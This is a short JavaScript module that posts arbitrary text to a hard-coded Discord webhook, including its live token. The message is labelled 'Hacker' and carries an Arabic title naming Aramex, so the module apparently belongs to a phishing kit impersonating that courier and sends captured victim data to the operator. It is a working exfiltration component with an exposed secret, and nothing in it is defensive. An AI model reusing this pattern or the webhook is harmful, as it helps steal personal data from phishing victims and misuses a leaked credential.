import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1326268640412172289/4y2v2eUEwgH7iWxtQQfIRWx1IWOXGvIUsywvV07xRPEfyfLetlSRPvjeiuW8hJFtqLZS",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
